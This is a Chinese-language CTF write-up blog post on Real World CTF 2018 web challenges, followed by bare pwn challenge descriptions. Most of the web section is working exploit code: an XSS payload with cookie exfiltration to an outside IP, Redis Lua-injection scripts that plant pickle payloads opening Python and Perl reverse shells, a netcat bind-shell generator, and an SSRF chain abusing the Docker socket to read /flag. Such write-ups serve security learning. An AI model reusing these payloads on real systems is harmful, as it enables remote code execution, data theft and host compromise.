---
title: real-world-ctf
date: 2018-07-30 20:25:36
tags: ctf
---

## Web

### dot free

1. ip2long

   ```
   ip_addr='192.168.2.10'
   
   # transfer ip to int
   def ip2long(ip):
       ip_list=ip.split('.')
       result=0
       for i in range(4):  #0,1,2,3
           result=result+int(ip_list[i])*256**(3-i)
       return result
   
   long=3232236042
   
   # transfer int to ip
   def long2ip(long):
       floor_list=[]
       yushu=long
       for i in reversed(range(4)):   #3,2,1,0
           res=divmod(yushu,256**i)
           floor_list.append(str(res[0]))
           yushu=res[1]
       return '.'.join(floor_list)
   
   a=long2ip(long)
   print(a)
   ```

2. 关键代码

   ```javascript
   window.addEventListener('message', function (e) {
           if (e.data.iframe) {
               if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("。") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {
                   if (e.data.iframe.type == "iframe") {
                       lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
                   } else {
                       lls(e.data.iframe.value)
                   }
               }
           }
       }, false);
       window.onload = function (ev) {
           postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
       }
   ```

3. 输入点

   ```
   decodeURIComponent(location.search.substr(1))
   ```

4. bypass

   ```
   e.data.iframe.value.indexOf("//") == -1
   =>
   http:/\
   
   "." 和 "。"均不能使用
   =>
   使用ip2long bypass
   
   ```

5. payload

   ```
   http://13.57.104.34/?{%22iframe%22:{%22value%22:%22http:\u002f\u005c2077186703:1234%22}}
   或者不要`http:` =>
   http://13.57.104.34/?{%22iframe%22:{%22value%22:%20%22\u002f\u005c2077186703:1234/a%22}}
   ```

6. getflag

   index.html

   ```
   document.location="http://123.207.90.143?flag="+document.cookie;
   ```

7. flag

   ```
   rwctf%7BL00kI5TheFlo9%7D
   ```

### bookhub

1. 测试登录

   ```
   your ip address isn't in the 10.0.0.0/8,127.0.0.0/8,172.16.0.0/12,192.168.0.0/16,18.213.16.123.
   ```

2. 进入代码查看

   ```
   def get_remote_addr():
       address = flask.request.headers.get('X-Forwarded-For', flask.request.remote_addr)
   
       try:
           ipaddress.ip_address(address)
       except ValueError:
           return None
       else:
           return address
   ```

3. 测试修改X-Forwarded-For，失败，原因: XFF做了反代理，伪造的 XFF被覆盖

4. 打开 18.213.16.123:5000

   发现该服务运行于debug模式下

   ```
   @login_required
   @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
   def refresh_session():
       """
           delete all session except the logined user
   
           :return: json
           """
   
           status = 'success'
           sessionid = flask.session.sid
           prefix = app.config['SESSION_KEY_PREFIX']
   
           if flask.request.form.get('submit', None) == '1':
               try:
                   rds.eval(rf'''
                   local function has_value (tab, val)
                       for index, value in ipairs(tab) do
                           if value == val then
                               return true
                           end
                       end
                   
                       return false
                   end
                   
                   local inputs = {{ "{prefix}{sessionid}" }}
                   local sessions = redis.call("keys", "{prefix}*")
                   
                   for index, sid in ipairs(sessions) do
                       if not has_value(inputs, sid) then
                           redis.call("del", sid)
                       end
                   end
                   ''', 0)
               except redis.exceptions.ResponseError as e:
                   app.logger.exception(e)
                   status = 'fail'
   
           return flask.jsonify(dict(status=status))
   ```

   上边这一段代码由于`@login_required` 写在route上边，所以存在未授权访问。

   ![](/images/realworldctf/TIM截图20180801194537.png)

5. 添加csrf_token

   ![](/images/realworldctf/TIM截图20180801195906.png)

6. 漏洞

   ```
   local inputs = {{ "{prefix}{sessionid}" }}
   local sessions = redis.call("keys", "{prefix}*")
   ```

   这里使用字符串拼接，存在问题，可以通过闭合双引号，使得redis执行恶意代码。

7. 跟踪`{prefix}`

   ```
    prefix = app.config['SESSION_KEY_PREFIX']
    
    app.config['SESSION_KEY_PREFIX'] = 'bookhub:session:'
   ```

8. 构造payload

   ```
   af5e1a4c-23b2-4f87-abf6-96a60d61d8b3",redis evilcode,"bookhub:session:tianji
   ```

   结果：

   ```
   { "bookhub:session:af5e1a4c-23b2-4f87-abf6-96a60d61d8b3",redis evilcode,"bookhub:session:tianji" }
   ```

9. 参考文件

   ```text
   https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
   https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html
   ```

10. evil code

  > redis.call("set","bookhub:session:tianji",反弹shell) 

11. payload

    ```
    import cPickle
    import os
    import requests
    import re
    import urllib
    
    DEBUG = 0
    
    URL = "http://18.213.16.123:5000/" if not DEBUG else "http://127.0.0.1:5000/"
    
    class exp(object):
        def __reduce__(self):
            listen_ip = "123.207.90.143"
            listen_port = 1234
            s = """curl 123.207.90.143:1234"""
            return (os.system,(s,))
    
    e = exp()
    s = cPickle.dumps(e)
    s_bypass = ""
    for i in s:
        s_bypass +="string.char(%s).."%ord(i)
    evilcode = '''redis.call("set","bookhub:session:tianji",%s)'''%s_bypass[:-2]
    payload = '''2047a141-2493-4f81-b315-8b8d95d3db33",%s,"bookhub:session:tianji'''%evilcode
    payload = payload.replace(" ","")
    
    
    if __name__ == '__main__':
        headers = {
            "Cookie": 'bookhub-session=%s' % payload,
            "Content-Type": "application/x-www-form-urlencoded",
            'X-CSRFToken': '',
        }
    
        print headers["Cookie"]
    
        res = requests.get(URL + 'login/', headers=headers)
        if res.status_code == 200:
            html = res.content
            r = re.findall(r'csrf_token" type="hidden" value="(.*?)">', html)
            if r:
                headers['X-CSRFToken'] = r[0]
                # refresh_session
                data = {'submit': '1'}
                res = requests.post(URL + 'admin/system/refresh_session/',
                               data=data, headers=headers)
                if res.status_code == 200:
                    print(res.content)
                else:
                    print(res.content)
                # fuck
                headers['Cookie'] = 'bookhub-session=tianji'
                res = requests.get(URL + 'login/', headers=headers)
                if res.status_code == 200:
                    print(res.content)
                else:
                    print(res.content)
    ```

    收到响应。

    ![](/images/realworldctf/TIM截图20180802110118.png)

12. 修改payload，获取flag

    payload1:

    ```
    import requests
    import re
    import json
    import random
    import string
    import cPickle
    import os
    import urllib
    
    req = requests.Session()
    
    DEBUG = 0
    
    URL = "http://18.213.16.123:5000/" if not DEBUG else "http://127.0.0.1:5000/"
    
    
    def rs(n=6):
        return ''.join(random.sample(string.ascii_letters + string.digits, n))
    
    
    class exp(object):
    
        def __reduce__(self):
            listen_ip = "123.207.90.143"
            listen_port = 1234
            s = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' % (
                listen_ip, listen_port)
            return (os.system, (s,))
    
    x = [{'_fresh': False, '_permanent': True,
          'csrf_token': '2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8', 'exp': exp()}]
    s = cPickle.dumps(x)
    
    if __name__ == '__main__':
        payload = urllib.quote(s)
        yoursid = 'vvv'
        funcode = r"local function urlDecode(s) s = string.gsub(s, '%%(%x%x)', function(h) return string.char(tonumber(h, 16)) end) return s end"
        # 插入payload并防止del
        sid = '%s\\" } %s ' % (rs(6), funcode) + \
            'redis.call(\\"set\\",\\"bookhub:session:%s\\",\\urlDecode("%s\\")) inputs = { \"bookhub:session:%s\" } --' % (
                yoursid, payload, yoursid)
        headers = {
            "Cookie": 'bookhub-session="x%s"' % sid,
            "Content-Type": "application/x-www-form-urlencoded",
            'X-CSRFToken': '',
        }
    
        res = req.get(URL + 'login/', headers=headers)
        if res.status_code == 200:
            html = res.content
            r = re.findall(r'csrf_token" type="hidden" value="(.*?)">', html)
            if r:
                headers['X-CSRFToken'] = r[0]
                # refresh_session
                data = {'submit': '1'}
                res = req.post(URL + 'admin/system/refresh_session/',
                               data=data, headers=headers)
                if res.status_code == 200:
                    print(res.content)
                else:
                    print(res.content)
                # fuck
                headers['Cookie'] = 'bookhub-session=vvv'
                res = req.get(URL + 'admin/', headers=headers)
                if res.status_code == 200:
                    print(res.content)
                else:
                    print(res.content)
    ```

    payload2:

    ```
    __AUTHOR__ = 'Virink'
    
    import os
    import sys
    import requests as req
    import re
    from urllib import quote as urlencode
    try:
        import cPickle as pickle
    except ImportError:
        import pickle
    
    URL = "http://18.213.16.123:5000/"
    listen_ip = '123.207.90.143'
    listen_port = 1234
    
    class exp(object):
    
        def __reduce__(self):
            s = "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" % (listen_ip, listen_port)
            return (os.system, (s,))
    
    if __name__ == '__main__':
        payload = urlencode(pickle.dumps([exp()]))
        # 插入payload并防止del
        sid = '\\" } local function urlDecode(s) s=string.gsub(s,\'%%(%x%x)\',function(h) return string.char(tonumber(h, 16)) end) return s end ' + \
            'redis.call(\\"set\\",\\"bookhub:session:qaq\\",urlDecode(\\"%s\\")) inputs = { \"bookhub:session:qaq\" } --' % (
                payload)
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        # 注入payload
        headers["Cookie"] = 'bookhub-session="%s"' % sid
        res = req.get(URL + 'login/', headers=headers)
        if res.status_code == 200:
            r = re.findall(r'csrf_token" type="hidden" value="(.*?)">',
                           res.content.decode('utf-8'))
            if r:
                # refresh_session
                headers['X-CSRFToken'] = r[0]
                data = {'submit': '1'}
                res = req.post(URL + 'admin/system/refresh_session/',
                               data=data, headers=headers)
                if res.status_code == 200:
                    # 触发RCE
                    req.get(URL + 'login/',
                            headers={'Cookie': 'bookhub-session=qaq'})
    ```

13. pickle payload生成

    ```
    #!/usr/bin/python
    #
    # Pickle deserialization RCE payload.
    # To be invoked with command to execute at it's first parameter.
    # Otherwise, the default one will be used.
    #
    
    import cPickle
    import os
    import sys
    import base64
    
    DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
    COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
    
    class PickleRce(object):
        def __reduce__(self):
            return (os.system,(COMMAND,))
    
    print base64.b64encode(cPickle.dumps(PickleRce()))
    ```

### Print MD

1. subject description

   ```
   Make HackMD printable ._. http://54.183.55.10/
   
   Hint: If you are not skilled at black-box testing, you need to figure out how PrintMD is compatible with outdated browsers. Flag is in the filesystem /flag
   
   Hint: Here is a render.js for you.
   ```

2. render.js

   ```
   const {Router} = require('express')
   const {matchesUA} = require('browserslist-useragent')
   const router = Router()
   const axios = require('axios')
   const md = require('../../plugins/md_srv')
   
   router.post('/render', function (req, res, next) {
     let ret = {}
     ret.ssr = !matchesUA(req.body.ua, {
       browsers: ["last 1 version", "> 1%", "IE 10"],
       _allowHigherVersions: true
     });
     if (ret.ssr) {
       axios(req.body.url).then(r => {
             ret.mdbody = md.render(r.data)
         res.json(ret)
       })
     }
     else {
       ret.mdbody = md.render('# 请稍候…')
       res.json(ret)
     }
   });
   module.exports = router
   ```

3. 漏洞

   **print.ba84889093b992d33112.js**中可以找到将markdown文档发送到服务端解析的代码 

   ```
   validate: function(e) {
       return e.query.url && e.query.url.startsWith("https://hackmd.io/")
   },
   asyncData: function(ctx) {
       if(!ctx.query.url.endsWith("/download")){
           ctx.query.url += "/download";
       }
       ctx.query.ua = ctx.req.headers["user-agent"] || "";
       return axios.post("/api/render", qs.stringify({...ctx.query})).then(function(e) {
           return {
               ...e.data,
               url: ctx.query.url
           }
       })
   },
   mounted: function() {
       if (!this.ssr){
           axios(this.url).then(function(t) {
               this.mdbody = md.render(t.data)
           })
       }
   }
   ```

   这里直接使用`qs.stringify({...ctx.query}`,因而在render.js中

   ```js
   axios(req.body.url).then(r => {
       ret.mdbody = md.render(r.data)
       res.json(ret)
   }
   ```

   `req.body.url` 可控

4. 漏洞利用

   **axios**这个东西是不支持**file://**协议的，但是通过文档可知，他支持**UNIX Socket** 。

   ![](/images/realworldctf/TIM截图20180802194917.png)

   测试`ping`。

   > GET http://54.183.55.10/print?url[url]=/_ping&url[socketPath]=/var/run/docker.sock&url=https://hackmd.io/ HTTP/1.1

   ![](/images/realworldctf/TIM截图20180802195456.png)

5. exploit.py

   ```python
   import requests as req
   import random
   import string
   from bs4 import BeautifulSoup
   from urllib import quote as urlencode
   
   URL = "http://54.183.55.10/print?{url}&url=https%3A%2F%2Fhackmd.io%2Fvbz2j6hkR9CIgABjEbRrzQ"
   
   headers = {
       "User-Agent": "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
   }
   
   
   def get(u):
       res = req.get(u, timeout=10, headers=headers)
       if res.status_code == 200:
           soup = BeautifulSoup(res.content, "lxml")
           body = soup.select(".markdown-body")
           if body:
               print(body[0].text)
               return True
       print("[-] error")
   
   
   def fuck(_u):
       _u += '&url[socketPath]=/var/run/docker.sock'
       pl = URL.format(url=_u)
       try:
           get(pl)
       except:
           pass
   
   if __name__ == '__main__':
       container_name = ''.join(random.sample(
           string.ascii_letters + string.digits, 6))
       _us = [
           'url[url]=/_ping&',
           'url[method]=post&url[url]=http://127.0.0.1/images/create?fromImage=alpine:latest',
           'url[method]=post&url[url]=http://127.0.0.1/containers/create?name=%s&url[data][Image]=alpine:latest&url[data][Volumes][flag][path]=/getflag&url[data][Binds][]=/flag:/getflag:ro&url[data][Entrypoint][]=/bin/ls' % container_name,
           'url[method]=post&url[url]=http://127.0.0.1/containers/%s/start' % container_name,
           'url[method]=get&url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag' % container_name
       ]
       for i in _us:
           fuck(i)
   ```

   exploit1.py

   ```
   #!/usr/bin/env python
   # -*- coding: utf-8 -*-
   #
   # SakiiR @ Hexpresso
   # cc XeR & BitK
   # Let's go now (:
   #
   # --+ Python 2 +--
   
   import random
   import pwn
   import requests
   import urllib
   
   urlencode = urllib.quote_plus
   
   OUTFILE = "flag.txt"
   MAX_ROWS = 100
   
   
   def random_container_name(n=10, charset=("abcdefghijklmnopqrstUVWXYZ"
                                            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                            "0123456789")):
       return ''.join([
           charset[random.randint(0, len(charset) - 1)] for _ in range(n)
       ])
   
   
   def main():
   
       container_name = random_container_name()
       pwn.log.info("Your container name is '{}'".format(container_name))
   
       # Pull alpine image :)
       # --------------------
       endpoint = urlencode("http://127.0.0.1/images/create?fromImage=alpine:latest")
       url = ('http://54.183.55.10/print'
              '?url[method]=POST'
              '&url[url]={}'
              '&url[socketPath]=/var/run/docker.sock'
              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)
       pwn.log.info("Pulling alpine:      '{}[...]'".format(url[:MAX_ROWS]))
       r = requests.get(url)
       pwn.log.info("Response: {}".format(r.status_code))
   
       # Creating container (image)
       # --------------------------
       endpoint = urlencode('http://127.0.0.1/containers/create?name={}'.format(container_name))
       url = ('http://54.183.55.10/print'
              '?url[method]=POST'
              '&url[url]={}'
              '&url[data][Volumes][flag][path]=/sakiir'
              '&url[data][Binds][]=/flag:/sakiir:ro'
              '&url[data][Entrypoint][]=/bin/sh'
              '&url[data][Image]=alpine:latest'
              '&url[socketPath]=/var/run/docker.sock'
              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)
       pwn.log.info("Creating container:  '{}[...]'".format(url[:MAX_ROWS]))
       pwn.log.info("This will take some time then crash with a 503")
       pwn.log.info("The container will still be created (:")
       r = requests.get(url)
       pwn.log.info("Response: {}".format(r.status_code))
   
       # Starting container_name
       # -----------------------
       endpoint = urlencode('http://127.0.0.1/containers/{}/start'.format(container_name))
       url = ('http://54.183.55.10/print'
              '?url[method]=POST'
              '&url[url]={}'
              '&url[socketPath]=/var/run/docker.sock'
              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)
       pwn.log.info("Starting container:  '{}[...]'".format(url[:MAX_ROWS]))
       r = requests.get(url)
       pwn.log.info("Response: {}".format(r.status_code))
   
       # Archive container (Archive the /sakiir directory and get it back :))
       # --------------------------------------------------------------------
       endpoint = urlencode("http://127.0.0.1/containers/{}/archive?path=/sakiir".format(container_name))
       url = ('http://54.183.55.10/print'
              '?url[method]=GET'
              '&url[url]={}'
              '&url[socketPath]=/var/run/docker.sock'
              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)
       pwn.log.info("Archiving container: '{}[...]'".format(url[:MAX_ROWS]))
       r = requests.get(url)
       pwn.log.info("Response: {}".format(r.status_code))
       with open(OUTFILE, 'w') as f:
           f.write(r.content)
           pwn.log.info("Flag written to file '{}'".format(OUTFILE))
   
   
   if __name__ == '__main__':
       main()
   ```

## pwn

### state-of-the-art vm

description:

```text
pwn

Latest QEMU is unbreakable, and we also hardened it.

NOTE: Host OS is Ubuntu 16.04

Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/state-of-the-art_vm_ddde3799c4dc2936eb182ec3dbefdfef.zip

nc 34.236.229.208 31338

Hint: Check start.sh
```

### Spectre-Free

```
pwn

The spectre's paper told me that the vulnerability can only be used to achieve information discloure, while I don't care about infoleak. Why not use it to exchange superior performance?

Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/togiveout.tgz.b5b489f104f50d9c5342ccf7180add5c

http://34.236.229.208

Hint: If you are not a master of Spectre, maybe you can use some unpatched 1day bug.

Hint 2: The spectre's patch happens to make certain bugs unable to be triggered. Hence Microsoft is lazy, so they may not even analyze or patch those bugs. Try to retrieve some unpatched 1 day bugs please.Also I found a tweet which may be related to this.
```

### kid vm

```
pwn Writing a vm is the best way to teach kids to learn vm escape.

Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/kid_vm_801180ca894848965a2d6424472e0acb.zip

nc 34.236.229.208 9999
```

### p90  RUSH B

```
pwn

When Cloud9 won the Major at Boston in 2018, another war starts off the cyberspace. The CTF players who enthuse about CS:GO not only want to run inside the Dust2 but also ""run"" outside the map. There is a challenge for guys who don't wanna be stuck in jail. Have fun with the Counter-Strike :)

Here is a readme for you https://www.dropbox.com/s/3nn5pwukg5mk6k6/readme.md?dl=0

A CS:GO server template: https://www.dropbox.com/s/7v48wdctx83d1lw/CSGO_Server_5ea3610faacd5b3bae1e97e33927caaf.zip?dl=0
```

### untrustworthy

```
pwn

Don't trust everything you see. There are secrets hidden in plain sight.

nc 18.211.57.236 13337

https://s3-us-west-1.amazonaws.com/realworldctf/distrib.zip
```

